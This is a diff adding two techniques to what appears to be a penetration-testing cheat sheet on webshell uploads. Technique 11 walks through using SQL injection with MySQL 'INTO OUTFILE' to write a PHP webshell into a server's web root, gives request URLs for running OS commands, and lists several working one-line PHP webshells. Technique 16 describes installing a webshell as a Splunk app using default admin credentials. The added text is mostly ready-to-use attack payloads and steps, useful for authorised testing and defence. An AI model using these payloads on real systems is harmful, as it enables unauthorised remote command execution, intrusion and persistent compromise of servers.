@@ -484,6 +484,50 @@ Example
 	       <SNIP>
 ```
 
+#### Technique 11 -  Webshell upload by exploiting a SQL injection (SQLi) vulnerability
+
+```
+Example
+➤ Step 1. Find a SQL injection vulnerability on a PHP website. The following pre-requites must be met:
+  	  - the underlying MySQL database is installed on the same server than the Website
+  	  - the Website is using a database account that has admin privileges over the MySQL database
+	  
+➤ Step 2. Find or guess the Web server installation path (DocumenRoot) Web root folder (e.g., it can be found thanks to "http://x.x.x.x/<path>/phpinfo.php").
+  	  - Example for Windows - XAMP = 'C:\XAMPP\htdocs\' or 'C:\XAMPP\htdocs\<website-name>\'
+    	  - Example for Linux   - LAMP = '/var/www/' or '/var/www/https/<website-name>/wp-content/uploads/', etc ... 
+  
+➤ Step 3. Using the SQL injection vulnerability, execute the following SQL query to write the Webshell in the Web root folder of the server
+  	  Examples: 
+	  - Linux server   - "select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/<website-name>/uploads/Webshell.php";"
+	  - Windows server - "select "< ? $c = $_GET['cmd']; $op = shell_exec($c); echo $op ? >" into outfile "C:\\XAMPP\\htdocs\\<website-name>\\Webshell.php";"
+
+➤ Step 4. Access to the 'Webshell.php' file with your web browser and execute OS commands
+          Examples:
+          - http://x.x.x.x/<website-name>/uploads/Webshell.php?cmd=whoami
+          - http://x.x.x.x/<website-name>/Webshell.php?cmd=whoami
+
+Note: Several PHP functions can be used in a webshell to execute OS commands such as
++ shell_exec() function: <?php echo shell_exec($_GET['cmd']); ?>
++ system() function: <?php system($_GET['cmd']); ?>
++ passthru() function: <?php echo passthru($_GET['cmd']); ?>
++ exec() function: <?php echo exec($_POST['cmd']); ?>
+```
+
+#### Technique 16 - Webshell upload  using a Splunk administration console
+```
+➤ Step 1. Download a Webshell customized for Splunk
+  - https://github.com/dionach/Splunk-Web-Shell
+  - https://github.com/TBGSecurity/splunk_shells
+
+➤ Step 2. Log into the administrator portal of a Splunk instance (e.g. admin access is uncredentialed or default creds 'admin:changeme' have not been changed)
+  - http://IP-splunk:8000/ or  https://IP-splunk:8000/ 
+
+➤ Step 3. To deploy the Webshell you have to:
+  - browse to "Manage Apps" and then click on "Install app from file", 
+  - click on "Choose File", select the "webShell.tar.gz" file and click on "Upload"
+  - click on "Restart Splunk"
+  - browse the new app (your Webshell)
+```
 ### II. List of common paths for the DocumentRoot directory (Web root folder)
 ```
 ➤ XAMP (Windows) = "c:\XAMPP\htdocs"
